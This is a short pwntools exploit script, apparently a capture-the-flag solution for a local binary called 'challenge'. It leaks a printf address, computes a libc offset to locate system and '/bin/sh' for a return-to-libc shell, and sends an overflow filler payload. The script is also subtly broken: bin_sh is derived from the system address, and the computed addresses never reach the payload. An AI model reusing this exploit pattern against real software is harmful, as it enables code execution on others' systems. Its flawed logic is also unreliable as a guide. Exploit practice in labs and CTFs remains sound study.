from pwn import *


p = process('./challenge')

payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll" #mmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz111122223333444455556666777788889999"

input("attach")

printf = p.recvuntil('\n').split()[-1][:-2]

elf = ELF("./challenge")
rop = ROP(elf)

gdb_printf = 0x7ffff7844e80
gdb_system = 0x7ffff782f440
gdb_bin_sh = 0x7ffff7993e9a

offset = gdb_printf - int(printf, 16)

system = gdb_system - offset
bin_sh = gdb_system - offset

print(printf)



p.sendline(payload)

p.interactive()